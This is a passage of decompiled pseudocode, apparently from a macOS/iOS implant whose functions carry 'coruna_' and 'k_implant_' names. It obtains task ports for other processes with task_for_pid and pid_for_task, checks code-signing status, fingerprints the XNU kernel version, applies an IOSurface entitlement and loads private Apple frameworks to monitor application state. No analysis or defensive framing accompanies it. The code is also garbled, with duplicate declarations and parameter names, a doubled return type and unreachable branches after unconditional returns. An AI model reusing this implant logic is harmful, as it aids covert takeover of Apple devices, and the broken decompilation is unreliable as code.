        goto load_ok_63;
      }
      if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
      return version;
      }
      ___stack_chk_fail();
      if (((m == (short *)0x0) || (*m != 2)) || ((ushort)m[1] < 2)) {
        plist = (int *)((unsigned long)plist & 0xffffffffffffff00);
        flags = coruna_csops(&plist);
        if ((flags != 0) || ((char)plist != '\0')) {
          version = 0x1e037;
          if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
          return version;
          }
          ___stack_chk_fail();
        }
        entry_23 = _calloc(1,0x38);
        if (entry_23 != (long *)0x0) {
          if (m != (short *)0x0) goto load_ok_64;
          goto load_ok_65;
        }
      }
      else {
        entry_23 = _calloc(1,0x38);
        if (entry_23 != (long *)0x0) {
load_ok_64:
          data = _calloc(1,0x10);
          if (data == (uint64_t *)0x0) {
            version = 0xad009;
          }
          else {
            *data = m;
            plist = (int *)0x0;
            version = coruna_mach_port_create(&plist,m);
            if ((int)version == 0) {
              cache_36 = 0;
              flags = coruna_calloc(&cache_36);
              if (flags != 0) {
                entry_23[6] = cache_36;
              }
              version = 0;
              *entry_23 = n;
              entry_23[2] = (long)val;
              entry_23[3] = (long)plist;
              entry_23[4] = (long)m;
              entry_23[5] = (long)data;
              *arg = entry_23;
              if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
              return version;
              }
              ___stack_chk_fail();
            }
            coruna_rwlock_iface_destroy(data);
          }
load_ok_65:
          _free(entry_23);
          if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
          return version;
          }
          ___stack_chk_fail();
        }
      }
      version = 0xad009;
      if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
      return version;
      }
      ___stack_chk_fail();
    }
  }
  idx = ___error();
  flags = *idx;
  str = (uint *)___error();
  u = -*str;
  if (-1 < flags) {
    u = *str;
  }
  version = (unsigned long)(u | 0x40000000);
load_ok_61:
  if (*(long *)k_implant_stack_chk_guard_slot == cache_39) {
    return version;
  }
  ___stack_chk_fail();
}
int * coruna_mach_port_deallocate_2145c(int *flags,char *path,uint64_t val,long handle,uint64_t id_2,
                  char *str_2,long addr_2,uint64_t size_3,uint64_t off_4,
                  uint64_t off_5,mach_port_name_t *arg,uint32_t *size)
{
  uint u;
  int *err;
  long *ptr;
  int *status;
  mach_port_name_t scratch;
  unsigned long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long thread_attr;
  
  thread_attr = *(long *)k_implant_stack_chk_guard_slot;
  status = (int *)0xad001;
  err = flags;
  if (flags != (int *)0x0) {
    if (path == (char *)0x0) {
      status = (int *)0x1e03f;
    }
    else {
      status = (int *)0x1e03f;
      if ((((*path != '\0') && (status = (int *)0x1e01c, handle != 0)) && ((int)id_2 != 0))
         && ((status = (int *)0x1e01d, str_2 != (char *)0x0 && (*str_2 != '\0')))) {
        if (((int)size_3 == 0) || (addr_2 != 0)) {
          ptr = *(long **)(flags + 10);
          status = (int *)0xad001;
          if (ptr != (long *)0x0) {
            scratch = k_implant_rodata_word_00026ae0;
            bootargs = k_implant_rodata_word_26ad8;
            thread_attr = k_implant_rodata_word_00026af0;
            bootargs = k_implant_rodata_word_26ae8;
            status = (int *)(**(void (**)(*ptr + 0x40))(*ptr,ptr + 1,&bootargs,2,0);
            err = status;
            if ((int)status == 0) {
              bootargs = bootargs & 0xffffffff00000000;
              status = (int *)coruna_realpath(path,val,&bootargs);
              err = status;
              if ((int)status == 0) {
                scratch = 0;
                status = (int *)coruna_task_for_pid(*(uint64_t *)(flags + 10),bootargs & 0xffffffff,
                                             &scratch);
                if ((uint)status == 0) {
                  status = (int *)coruna_pid_for_task(flags,scratch,handle,id_2,str_2,addr_2,
                                               size_3,off_4,off_5);
                  if ((int)status == 0) {
                    if (arg != (mach_port_name_t *)0x0) {
                      *arg = scratch;
                      scratch = 0;
                    }
                    if (size != (uint32_t *)0x0) {
                      *size = (uint32_t)bootargs;
                    }
                  }
                  err = status;
                  if (1 < scratch + 1) {
                    u = *(uint *)k_implant_mach_task_self_slot;
                    err = (int *)(unsigned long)u;
                    if (u != scratch) {
                      u = _mach_port_deallocate(u,scratch);
                      err = (int *)(unsigned long)u;
                    }
                  }
                }
                else {
                  err = (int *)_csops_audittoken(bootargs & 0xffffffff,0,0,0,1);
                  if ((int)err != 0) {
                    err = ___error();
                    u = 0x1e03f;
                    if (*err != 3) {
                      u = (uint)status;
                    }
                    status = (int *)(unsigned long)u;
                  }
                }
              }
              ptr = *(long **)(flags + 10);
              if ((ptr != (long *)0x0) && (ptr[1] != 0)) {
                err = (int *)(**(void (**)(*ptr + 0x30))();
              }
            }
          }
        }
        else {
          status = (int *)0x1e01e;
        }
      }
    }
  }
  if (*(long *)k_implant_stack_chk_guard_slot == thread_attr) {
    return status;
  }
  ___stack_chk_fail(err);
}





uint64_t
uint64_t coruna_pid_for_task(uint64_t *val,uint64_t id_2,int64_t arg,uint64_t size_3,char *path, int64_t arg,uint64_t off_4,uint64_t off_5,uint64_t off_6)
{
  kern_return_t lk1;
  int err;
  pid_t lp3;
  int status;
  uint64_t u;
  mach_port_name_t t;
  uint32_t scratch;
  int bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  
  bootargs = -1;
  if (val == (uint64_t *)0x0) {
    return 0xad001;
  }
  t = (mach_port_name_t)id_2;
  if (t + 1 < 2) {
    return 0x1e009;
  }
  if (arg == 0) {
    return 0x1e01c;
  }
  if ((int)size_3 == 0) {
    return 0x1e01c;
  }
  if (path == (char *)0x0) {
    return 0x1e01d;
  }
  if (*path == '\0') {
    return 0x1e01d;
  }
  if (((int)off_4 != 0) && (arg == 0)) {
    return 0x1e01e;
  }
  lk1 = _pid_for_task(t,&bootargs);
  status = bootargs;
  if (lk1 == 0) {
    serial_buf = 0;
    host_info = 0;
    err = coruna_parse_xnu_version(&host_info);
    if ((err == 0) && (0 < status)) {
      lp3 = _getpid();
      if (lp3 != status) {
        thread_attr = 0;
        status = _proc_pidinfo(status,0x13,0,&thread_attr,8);
        if (status != 8) {
          return 0x1e03f;
        }
        if ((int)thread_attr != 0x100000c) {
          return 0x1e03f;
        }
        if (2 < (thread_attr & 0xffffff)) {
          return 0x1e03f;
        }
      }
      u = coruna_implant_via_ctx_free_3(*val,id_2,arg,size_3);
      if ((int)u != 0) {
        return u;
      }
      host_info = coruna_u64_pack((host_info), (0xffffffff));
      lk1 = _pid_for_task(t,(int *)&host_info);
      if ((((lk1 == 0) && (0 < (int)host_info)) && (val[6] != 0)) &&
         (status = coruna_objc_msgsend_iface(), status == 2)) {
        return 0x1e041;
      }
      thread_attr = thread_attr & 0xffffffff00000000;
      scratch = 0;
      u = coruna_pthread_create(val[3],&thread_attr,&scratch);
      if ((int)u != 0) {
        return u;
      }
      u = coruna_apply_iosurface_entitlement(val[5],id_2);
      if ((int)u == 0) {
        host_info = 0;
        u = coruna_mach_port_deallocate(&host_info,*val,id_2,val[2],thread_attr & 0xffffffff,scratch);
        if ((int)u == 0) {
          u = coruna_run_end_last(host_info,arg,size_3,off_5,path,arg,off_4,off_6);
          coruna_mach_port_deallocate(host_info);
          return u;
        }
        return u;
      }
      return u;
    }
  }
  return 0x1e03f;
}
int * coruna_mach_port_deallocate_218cc(int *flags,uint64_t val,long handle,uint64_t id_2,char *path,
                  long addr_2,uint64_t size_3,uint64_t off_4,uint64_t off_5,
                  mach_port_name_t *arg)
{
  uint u;
  int *err;
  long *ptr;
  int *status;
  unsigned long scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  long bootargs;
  
  bootargs = *(long *)k_implant_stack_chk_guard_slot;
  status = (int *)0xad001;
  err = flags;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if ((int)val < 1) {
    status = (int *)0x1e03f;
    if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  status = (int *)0x1e01c;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if (path == (char *)0x0) {
    status = (int *)0x1e01d;
    if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  status = (int *)0x1e01d;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  if (((int)size_3 != 0) && (addr_2 == 0)) {
    status = (int *)0x1e01e;
    if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
    }
    ___stack_chk_fail(err);
  }
  ptr = *(long **)(flags + 10);
  status = (int *)0xad001;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  scratch = k_implant_rodata_word_00026ae0;
  scratch = k_implant_rodata_word_26ad8;
  thread_attr = k_implant_rodata_word_00026af0;
  bootargs = k_implant_rodata_word_26ae8;
  status = (int *)(**(void (**)(*ptr + 0x40))(*ptr,ptr + 1,&scratch,2,0);
  err = status;
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
  return status;
  }
  ___stack_chk_fail(err);
  scratch = scratch & 0xffffffff00000000;
  status = (int *)coruna_task_for_pid(*(uint64_t *)(flags + 10),val,&scratch);
  if ((uint)status == 0) {
    status = (int *)coruna_pid_for_task(flags,scratch & 0xffffffff,handle,id_2,path,addr_2,
                                 size_3,off_4,off_5);
    err = status;
    if (((int)status == 0) && (arg != (mach_port_name_t *)0x0)) {
      *arg = (mach_port_name_t)scratch;
      status = (int *)0x0;
done:
      scratch = scratch & 0xffffffff00000000;
    }
    else if (1 < (mach_port_name_t)scratch + 1) {
      u = *(uint *)k_implant_mach_task_self_slot;
      err = (int *)(unsigned long)u;
      if (u != (mach_port_name_t)scratch) {
        u = _mach_port_deallocate(u,(mach_port_name_t)scratch);
        err = (int *)(unsigned long)u;
        goto done;
      }
    }
  }
  else {
    err = (int *)_csops_audittoken(val,0,0,0,1);
    if ((int)err != 0) {
      err = ___error();
      u = 0x1e03f;
      if (*err != 3) {
        u = (uint)status;
      }
      status = (int *)(unsigned long)u;
    }
  }
  ptr = *(long **)(flags + 10);
  if ((ptr != (long *)0x0) && (ptr[1] != 0)) {
    err = (int *)(**(void (**)(*ptr + 0x30))();
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == bootargs) {
    return status;
  }
  ___stack_chk_fail(err);
}





uint32_t coruna_parse_xnu_version(void)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  uint32_t u;
  uint64_t scratch;
  size_t bootargs;
  char thread_attr [520];
  long host_info;
  
  host_info = *(long *)k_implant_stack_chk_guard_slot;
  u = 0xad011;
  thread_attr[0x1e8] = '\0';
  thread_attr[0x1e9] = '\0';
  thread_attr[0x1ea] = '\0';
  thread_attr[0x1eb] = '\0';
  thread_attr[0x1ec] = '\0';
  thread_attr[0x1ed] = '\0';
  thread_attr[0x1ee] = '\0';
  thread_attr[0x1ef] = '\0';
  thread_attr[0x1e0] = '\0';
  thread_attr[0x1e1] = '\0';
  thread_attr[0x1e2] = '\0';
  thread_attr[0x1e3] = '\0';
  thread_attr[0x1e4] = '\0';
  thread_attr[0x1e5] = '\0';
  thread_attr[0x1e6] = '\0';
  thread_attr[0x1e7] = '\0';
  thread_attr[0x1f8] = '\0';
  thread_attr[0x1f9] = '\0';
  thread_attr[0x1fa] = '\0';
  thread_attr[0x1fb] = '\0';
  thread_attr[0x1fc] = '\0';
  thread_attr[0x1fd] = '\0';
  thread_attr[0x1fe] = '\0';
  thread_attr[0x1ff] = '\0';
  thread_attr[0x1f0] = '\0';
  thread_attr[0x1f1] = '\0';
  thread_attr[0x1f2] = '\0';
  thread_attr[499] = '\0';
  thread_attr[500] = '\0';
  thread_attr[0x1f5] = '\0';
  thread_attr[0x1f6] = '\0';
  thread_attr[0x1f7] = '\0';
  thread_attr[0x1c8] = '\0';
  thread_attr[0x1c9] = '\0';
  thread_attr[0x1ca] = '\0';
  thread_attr[0x1cb] = '\0';
  thread_attr[0x1cc] = '\0';
  thread_attr[0x1cd] = '\0';
  thread_attr[0x1ce] = '\0';
  thread_attr[0x1cf] = '\0';
  thread_attr[0x1c0] = '\0';
  thread_attr[0x1c1] = '\0';
  thread_attr[0x1c2] = '\0';
  thread_attr[0x1c3] = '\0';
  thread_attr[0x1c4] = '\0';
  thread_attr[0x1c5] = '\0';
  thread_attr[0x1c6] = '\0';
  thread_attr[0x1c7] = '\0';
  thread_attr[0x1d8] = '\0';
  thread_attr[0x1d9] = '\0';
  thread_attr[0x1da] = '\0';
  thread_attr[0x1db] = '\0';
  thread_attr[0x1dc] = '\0';
  thread_attr[0x1dd] = '\0';
  thread_attr[0x1de] = '\0';
  thread_attr[0x1df] = '\0';
  thread_attr[0x1d0] = '\0';
  thread_attr[0x1d1] = '\0';
  thread_attr[0x1d2] = '\0';
  thread_attr[0x1d3] = '\0';
  thread_attr[0x1d4] = '\0';
  thread_attr[0x1d5] = '\0';
  thread_attr[0x1d6] = '\0';
  thread_attr[0x1d7] = '\0';
  thread_attr[0x1a8] = '\0';
  thread_attr[0x1a9] = '\0';
  thread_attr[0x1aa] = '\0';
  thread_attr[0x1ab] = '\0';
  thread_attr[0x1ac] = '\0';
  thread_attr[0x1ad] = '\0';
  thread_attr[0x1ae] = '\0';
  thread_attr[0x1af] = '\0';
  thread_attr[0x1a0] = '\0';
  thread_attr[0x1a1] = '\0';
  thread_attr[0x1a2] = '\0';
  thread_attr[0x1a3] = '\0';
  thread_attr[0x1a4] = '\0';
  thread_attr[0x1a5] = '\0';
  thread_attr[0x1a6] = '\0';
  thread_attr[0x1a7] = '\0';
  thread_attr[0x1b8] = '\0';
  thread_attr[0x1b9] = '\0';
  thread_attr[0x1ba] = '\0';
  thread_attr[0x1bb] = '\0';
  thread_attr[0x1bc] = '\0';
  thread_attr[0x1bd] = '\0';
  thread_attr[0x1be] = '\0';
  thread_attr[0x1bf] = '\0';
  thread_attr[0x1b0] = '\0';
  thread_attr[0x1b1] = '\0';
  thread_attr[0x1b2] = '\0';
  thread_attr[0x1b3] = '\0';
  thread_attr[0x1b4] = '\0';
  thread_attr[0x1b5] = '\0';
  thread_attr[0x1b6] = '\0';
  thread_attr[0x1b7] = '\0';
  thread_attr[0x188] = '\0';
  thread_attr[0x189] = '\0';
  thread_attr[0x18a] = '\0';
  thread_attr[0x18b] = '\0';
  thread_attr[0x18c] = '\0';
  thread_attr[0x18d] = '\0';
  thread_attr[0x18e] = '\0';
  thread_attr[399] = '\0';
  thread_attr[0x180] = '\0';
  thread_attr[0x181] = '\0';
  thread_attr[0x182] = '\0';
  thread_attr[0x183] = '\0';
  thread_attr[0x184] = '\0';
  thread_attr[0x185] = '\0';
  thread_attr[0x186] = '\0';
  thread_attr[0x187] = '\0';
  thread_attr[0x198] = '\0';
  thread_attr[0x199] = '\0';
  thread_attr[0x19a] = '\0';
  thread_attr[0x19b] = '\0';
  thread_attr[0x19c] = '\0';
  thread_attr[0x19d] = '\0';
  thread_attr[0x19e] = '\0';
  thread_attr[0x19f] = '\0';
  thread_attr[400] = '\0';
  thread_attr[0x191] = '\0';
  thread_attr[0x192] = '\0';
  thread_attr[0x193] = '\0';
  thread_attr[0x194] = '\0';
  thread_attr[0x195] = '\0';
  thread_attr[0x196] = '\0';
  thread_attr[0x197] = '\0';
  thread_attr[0x168] = '\0';
  thread_attr[0x169] = '\0';
  thread_attr[0x16a] = '\0';
  thread_attr[0x16b] = '\0';
  thread_attr[0x16c] = '\0';
  thread_attr[0x16d] = '\0';
  thread_attr[0x16e] = '\0';
  thread_attr[0x16f] = '\0';
  thread_attr[0x160] = '\0';
  thread_attr[0x161] = '\0';
  thread_attr[0x162] = '\0';
  thread_attr[0x163] = '\0';
  thread_attr[0x164] = '\0';
  thread_attr[0x165] = '\0';
  thread_attr[0x166] = '\0';
  thread_attr[0x167] = '\0';
  thread_attr[0x178] = '\0';
  thread_attr[0x179] = '\0';
  thread_attr[0x17a] = '\0';
  thread_attr[0x17b] = '\0';
  thread_attr[0x17c] = '\0';
  thread_attr[0x17d] = '\0';
  thread_attr[0x17e] = '\0';
  thread_attr[0x17f] = '\0';
  thread_attr[0x170] = '\0';
  thread_attr[0x171] = '\0';
  thread_attr[0x172] = '\0';
  thread_attr[0x173] = '\0';
  thread_attr[0x174] = '\0';
  thread_attr[0x175] = '\0';
  thread_attr[0x176] = '\0';
  thread_attr[0x177] = '\0';
  thread_attr[0x148] = '\0';
  thread_attr[0x149] = '\0';
  thread_attr[0x14a] = '\0';
  thread_attr[0x14b] = '\0';
  thread_attr[0x14c] = '\0';
  thread_attr[0x14d] = '\0';
  thread_attr[0x14e] = '\0';
  thread_attr[0x14f] = '\0';
  thread_attr[0x140] = '\0';
  thread_attr[0x141] = '\0';
  thread_attr[0x142] = '\0';
  thread_attr[0x143] = '\0';
  thread_attr[0x144] = '\0';
  thread_attr[0x145] = '\0';
  thread_attr[0x146] = '\0';
  thread_attr[0x147] = '\0';
  thread_attr[0x158] = '\0';
  thread_attr[0x159] = '\0';
  thread_attr[0x15a] = '\0';
  thread_attr[0x15b] = '\0';
  thread_attr[0x15c] = '\0';
  thread_attr[0x15d] = '\0';
  thread_attr[0x15e] = '\0';
  thread_attr[0x15f] = '\0';
  thread_attr[0x150] = '\0';
  thread_attr[0x151] = '\0';
  thread_attr[0x152] = '\0';
  thread_attr[0x153] = '\0';
  thread_attr[0x154] = '\0';
  thread_attr[0x155] = '\0';
  thread_attr[0x156] = '\0';
  thread_attr[0x157] = '\0';
  thread_attr[0x128] = '\0';
  thread_attr[0x129] = '\0';
  thread_attr[0x12a] = '\0';
  thread_attr[299] = '\0';
  thread_attr[300] = '\0';
  thread_attr[0x12d] = '\0';
  thread_attr[0x12e] = '\0';
  thread_attr[0x12f] = '\0';
  thread_attr[0x120] = '\0';
  thread_attr[0x121] = '\0';
  thread_attr[0x122] = '\0';
  thread_attr[0x123] = '\0';
  thread_attr[0x124] = '\0';
  thread_attr[0x125] = '\0';
  thread_attr[0x126] = '\0';
  thread_attr[0x127] = '\0';
  thread_attr[0x138] = '\0';
  thread_attr[0x139] = '\0';
  thread_attr[0x13a] = '\0';
  thread_attr[0x13b] = '\0';
  thread_attr[0x13c] = '\0';
  thread_attr[0x13d] = '\0';
  thread_attr[0x13e] = '\0';
  thread_attr[0x13f] = '\0';
  thread_attr[0x130] = '\0';
  thread_attr[0x131] = '\0';
  thread_attr[0x132] = '\0';
  thread_attr[0x133] = '\0';
  thread_attr[0x134] = '\0';
  thread_attr[0x135] = '\0';
  thread_attr[0x136] = '\0';
  thread_attr[0x137] = '\0';
  thread_attr[0x108] = '\0';
  thread_attr[0x109] = '\0';
  thread_attr[0x10a] = '\0';
  thread_attr[0x10b] = '\0';
  thread_attr[0x10c] = '\0';
  thread_attr[0x10d] = '\0';
  thread_attr[0x10e] = '\0';
  thread_attr[0x10f] = '\0';
  thread_attr[0x100] = '\0';
  thread_attr[0x101] = '\0';
  thread_attr[0x102] = '\0';
  thread_attr[0x103] = '\0';
  thread_attr[0x104] = '\0';
  thread_attr[0x105] = '\0';
  thread_attr[0x106] = '\0';
  thread_attr[0x107] = '\0';
  thread_attr[0x118] = '\0';
  thread_attr[0x119] = '\0';
  thread_attr[0x11a] = '\0';
  thread_attr[0x11b] = '\0';
  thread_attr[0x11c] = '\0';
  thread_attr[0x11d] = '\0';
  thread_attr[0x11e] = '\0';
  thread_attr[0x11f] = '\0';
  thread_attr[0x110] = '\0';
  thread_attr[0x111] = '\0';
  thread_attr[0x112] = '\0';
  thread_attr[0x113] = '\0';
  thread_attr[0x114] = '\0';
  thread_attr[0x115] = '\0';
  thread_attr[0x116] = '\0';
  thread_attr[0x117] = '\0';
  thread_attr[0xe8] = '\0';
  thread_attr[0xe9] = '\0';
  thread_attr[0xea] = '\0';
  thread_attr[0xeb] = '\0';
  thread_attr[0xec] = '\0';
  thread_attr[0xed] = '\0';
  thread_attr[0xee] = '\0';
  thread_attr[0xef] = '\0';
  thread_attr[0xe0] = '\0';
  thread_attr[0xe1] = '\0';
  thread_attr[0xe2] = '\0';
  thread_attr[0xe3] = '\0';
  thread_attr[0xe4] = '\0';
  thread_attr[0xe5] = '\0';
  thread_attr[0xe6] = '\0';
  thread_attr[0xe7] = '\0';
  thread_attr[0xf8] = '\0';
  thread_attr[0xf9] = '\0';
  thread_attr[0xfa] = '\0';
  thread_attr[0xfb] = '\0';
  thread_attr[0xfc] = '\0';
  thread_attr[0xfd] = '\0';
  thread_attr[0xfe] = '\0';
  thread_attr[0xff] = '\0';
  thread_attr[0xf0] = '\0';
  thread_attr[0xf1] = '\0';
  thread_attr[0xf2] = '\0';
  thread_attr[0xf3] = '\0';
  thread_attr[0xf4] = '\0';
  thread_attr[0xf5] = '\0';
  thread_attr[0xf6] = '\0';
  thread_attr[0xf7] = '\0';
  thread_attr[200] = '\0';
  thread_attr[0xc9] = '\0';
  thread_attr[0xca] = '\0';
  thread_attr[0xcb] = '\0';
  thread_attr[0xcc] = '\0';
  thread_attr[0xcd] = '\0';
  thread_attr[0xce] = '\0';
  thread_attr[0xcf] = '\0';
  thread_attr[0xc0] = '\0';
  thread_attr[0xc1] = '\0';
  thread_attr[0xc2] = '\0';
  thread_attr[0xc3] = '\0';
  thread_attr[0xc4] = '\0';
  thread_attr[0xc5] = '\0';
  thread_attr[0xc6] = '\0';
  thread_attr[199] = '\0';
  thread_attr[0xd8] = '\0';
  thread_attr[0xd9] = '\0';
  thread_attr[0xda] = '\0';
  thread_attr[0xdb] = '\0';
  thread_attr[0xdc] = '\0';
  thread_attr[0xdd] = '\0';
  thread_attr[0xde] = '\0';
  thread_attr[0xdf] = '\0';
  thread_attr[0xd0] = '\0';
  thread_attr[0xd1] = '\0';
  thread_attr[0xd2] = '\0';
  thread_attr[0xd3] = '\0';
  thread_attr[0xd4] = '\0';
  thread_attr[0xd5] = '\0';
  thread_attr[0xd6] = '\0';
  thread_attr[0xd7] = '\0';
  thread_attr[0xa8] = '\0';
  thread_attr[0xa9] = '\0';
  thread_attr[0xaa] = '\0';
  thread_attr[0xab] = '\0';
  thread_attr[0xac] = '\0';
  thread_attr[0xad] = '\0';
  thread_attr[0xae] = '\0';
  thread_attr[0xaf] = '\0';
  thread_attr[0xa0] = '\0';
  thread_attr[0xa1] = '\0';
  thread_attr[0xa2] = '\0';
  thread_attr[0xa3] = '\0';
  thread_attr[0xa4] = '\0';
  thread_attr[0xa5] = '\0';
  thread_attr[0xa6] = '\0';
  thread_attr[0xa7] = '\0';
  thread_attr[0xb8] = '\0';
  thread_attr[0xb9] = '\0';
  thread_attr[0xba] = '\0';
  thread_attr[0xbb] = '\0';
  thread_attr[0xbc] = '\0';
  thread_attr[0xbd] = '\0';
  thread_attr[0xbe] = '\0';
  thread_attr[0xbf] = '\0';
  thread_attr[0xb0] = '\0';
  thread_attr[0xb1] = '\0';
  thread_attr[0xb2] = '\0';
  thread_attr[0xb3] = '\0';
  thread_attr[0xb4] = '\0';
  thread_attr[0xb5] = '\0';
  thread_attr[0xb6] = '\0';
  thread_attr[0xb7] = '\0';
  thread_attr[0x88] = '\0';
  thread_attr[0x89] = '\0';
  thread_attr[0x8a] = '\0';
  thread_attr[0x8b] = '\0';
  thread_attr[0x8c] = '\0';
  thread_attr[0x8d] = '\0';
  thread_attr[0x8e] = '\0';
  thread_attr[0x8f] = '\0';
  thread_attr[0x80] = '\0';
  thread_attr[0x81] = '\0';
  thread_attr[0x82] = '\0';
  thread_attr[0x83] = '\0';
  thread_attr[0x84] = '\0';
  thread_attr[0x85] = '\0';
  thread_attr[0x86] = '\0';
  thread_attr[0x87] = '\0';
  thread_attr[0x98] = '\0';
  thread_attr[0x99] = '\0';
  thread_attr[0x9a] = '\0';
  thread_attr[0x9b] = '\0';
  thread_attr[0x9c] = '\0';
  thread_attr[0x9d] = '\0';
  thread_attr[0x9e] = '\0';
  thread_attr[0x9f] = '\0';
  thread_attr[0x90] = '\0';
  thread_attr[0x91] = '\0';
  thread_attr[0x92] = '\0';
  thread_attr[0x93] = '\0';
  thread_attr[0x94] = '\0';
  thread_attr[0x95] = '\0';
  thread_attr[0x96] = '\0';
  thread_attr[0x97] = '\0';
  thread_attr[0x68] = '\0';
  thread_attr[0x69] = '\0';
  thread_attr[0x6a] = '\0';
  thread_attr[0x6b] = '\0';
  thread_attr[0x6c] = '\0';
  thread_attr[0x6d] = '\0';
  thread_attr[0x6e] = '\0';
  thread_attr[0x6f] = '\0';
  thread_attr[0x60] = '\0';
  thread_attr[0x61] = '\0';
  thread_attr[0x62] = '\0';
  thread_attr[99] = '\0';
  thread_attr[100] = '\0';
  thread_attr[0x65] = '\0';
  thread_attr[0x66] = '\0';
  thread_attr[0x67] = '\0';
  thread_attr[0x78] = '\0';
  thread_attr[0x79] = '\0';
  thread_attr[0x7a] = '\0';
  thread_attr[0x7b] = '\0';
  thread_attr[0x7c] = '\0';
  thread_attr[0x7d] = '\0';
  thread_attr[0x7e] = '\0';
  thread_attr[0x7f] = '\0';
  thread_attr[0x70] = '\0';
  thread_attr[0x71] = '\0';
  thread_attr[0x72] = '\0';
  thread_attr[0x73] = '\0';
  thread_attr[0x74] = '\0';
  thread_attr[0x75] = '\0';
  thread_attr[0x76] = '\0';
  thread_attr[0x77] = '\0';
  thread_attr[0x48] = '\0';
  thread_attr[0x49] = '\0';
  thread_attr[0x4a] = '\0';
  thread_attr[0x4b] = '\0';
  thread_attr[0x4c] = '\0';
  thread_attr[0x4d] = '\0';
  thread_attr[0x4e] = '\0';
  thread_attr[0x4f] = '\0';
  thread_attr[0x40] = '\0';
  thread_attr[0x41] = '\0';
  thread_attr[0x42] = '\0';
  thread_attr[0x43] = '\0';
  thread_attr[0x44] = '\0';
  thread_attr[0x45] = '\0';
  thread_attr[0x46] = '\0';
  thread_attr[0x47] = '\0';
  thread_attr[0x58] = '\0';
  thread_attr[0x59] = '\0';
  thread_attr[0x5a] = '\0';
  thread_attr[0x5b] = '\0';
  thread_attr[0x5c] = '\0';
  thread_attr[0x5d] = '\0';
  thread_attr[0x5e] = '\0';
  thread_attr[0x5f] = '\0';
  thread_attr[0x50] = '\0';
  thread_attr[0x51] = '\0';
  thread_attr[0x52] = '\0';
  thread_attr[0x53] = '\0';
  thread_attr[0x54] = '\0';
  thread_attr[0x55] = '\0';
  thread_attr[0x56] = '\0';
  thread_attr[0x57] = '\0';
  thread_attr[0x28] = '\0';
  thread_attr[0x29] = '\0';
  thread_attr[0x2a] = '\0';
  thread_attr[0x2b] = '\0';
  thread_attr[0x2c] = '\0';
  thread_attr[0x2d] = '\0';
  thread_attr[0x2e] = '\0';
  thread_attr[0x2f] = '\0';
  thread_attr[0x20] = '\0';
  thread_attr[0x21] = '\0';
  thread_attr[0x22] = '\0';
  thread_attr[0x23] = '\0';
  thread_attr[0x24] = '\0';
  thread_attr[0x25] = '\0';
  thread_attr[0x26] = '\0';
  thread_attr[0x27] = '\0';
  thread_attr[0x38] = '\0';
  thread_attr[0x39] = '\0';
  thread_attr[0x3a] = '\0';
  thread_attr[0x3b] = '\0';
  thread_attr[0x3c] = '\0';
  thread_attr[0x3d] = '\0';
  thread_attr[0x3e] = '\0';
  thread_attr[0x3f] = '\0';
  thread_attr[0x30] = '\0';
  thread_attr[0x31] = '\0';
  thread_attr[0x32] = '\0';
  thread_attr[0x33] = '\0';
  thread_attr[0x34] = '\0';
  thread_attr[0x35] = '\0';
  thread_attr[0x36] = '\0';
  thread_attr[0x37] = '\0';
  thread_attr[8] = '\0';
  thread_attr[9] = '\0';
  thread_attr[10] = '\0';
  thread_attr[0xb] = '\0';
  thread_attr[0xc] = '\0';
  thread_attr[0xd] = '\0';
  thread_attr[0xe] = '\0';
  thread_attr[0xf] = '\0';
  thread_attr[0] = '\0';
  thread_attr[1] = '\0';
  thread_attr[2] = '\0';
  thread_attr[3] = '\0';
  thread_attr[4] = '\0';
  thread_attr[5] = '\0';
  thread_attr[6] = '\0';
  thread_attr[7] = '\0';
  thread_attr[0x18] = '\0';
  thread_attr[0x19] = '\0';
  thread_attr[0x1a] = '\0';
  thread_attr[0x1b] = '\0';
  thread_attr[0x1c] = '\0';
  thread_attr[0x1d] = '\0';
  thread_attr[0x1e] = '\0';
  thread_attr[0x1f] = '\0';
  thread_attr[0x10] = '\0';
  thread_attr[0x11] = '\0';
  thread_attr[0x12] = '\0';
  thread_attr[0x13] = '\0';
  thread_attr[0x14] = '\0';
  thread_attr[0x15] = '\0';
  thread_attr[0x16] = '\0';
  thread_attr[0x17] = '\0';
  host = _mach_host_self();
  lk1 = _host_kernel_version(host,thread_attr);
  if (lk1 != 0) {
    if (*(long *)k_implant_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
    }
    return u;
  }
  ptr = _strstr(thread_attr,"xnu-");
  if (ptr != (char *)0x0) {
    err = _sscanf(ptr + 4,"%u.%u.%u");
    u = 0;
    if (err != 3) {
      u = 0xad011;
    }
  }
fail:
  if (*(long *)k_implant_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
  }
  return u;
}





uint64_t coruna_bks_app_state(long *handle)
{
  int err;
  long handle;
  long addr;
  long off;
  long base;
  long ctx_val;
  long serial;
  uint64_t u;
  
  u = 0;
  if (handle != (long *)0x0) {
    handle[1] = 0;
    *handle = 0;
    handle[3] = 0;
    handle[2] = 0;
    handle = _dlopen("/System/Library/PrivateFrameworks/AssertionServices.framework/AssertionServices"
                    ,10);
    if (handle == 0) {
      u = 1;
    }
    else {
      addr = _objc_getClass("BKSApplicationStateMonitor");
      off = _sel_registerName("alloc");
      base = _sel_registerName("init");
      ctx_val = _sel_registerName("release");
